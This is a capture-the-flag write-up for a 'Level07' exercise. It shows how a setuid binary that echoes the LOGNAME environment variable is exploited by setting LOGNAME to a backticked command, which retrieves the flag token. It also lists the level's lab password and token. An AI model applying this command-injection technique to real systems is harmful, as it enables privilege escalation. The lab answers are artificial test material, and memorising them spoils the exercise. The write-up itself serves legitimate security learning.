# Level07 - Flag07

## Local script usage

```shell
Usage: ./main.sh
```

## Passwords and token

|         |                             |
| ------- | --------------------------- |
| level07 | `wiok45aaoguiboiki2tuin6ub` |
| flag07  |                             |
| token   | `fiumuikeil55xe9cu4dood66h` |

## Steps to resolve on VM

1. Connect to `level07` user and notice there is an executable owned by `flag07` user

```bash
su level07
# Enter the token

ls -l
> -rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```

2. Check the files

```bash
# By executing it, it prints us "level07"
./level07
> level07

# We check the content executed by this executable
strings level07
> [...]
> getenv
> [...]
> LOGNAME
> /bin/echo %s 
> [...]
> /home/user/level07/level07.c
> [...]
# We can see that it's a C program that prints via 'echo'

# And we notice that 'getenv' have been used, probably with the env variable "LOGNAME"
cat $LOGNAME
> level07
export LOGNAME=test
./level07
> test
# Let's exploit that
```

3. Exploit LOGNAME env variable

```bash
export LOGNAME=\`getflag\`

./level07
> Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```

---

## Sources

### SHELL

- [getenv](http://www0.cs.ucl.ac.uk/staff/W.Langdon/getenv/)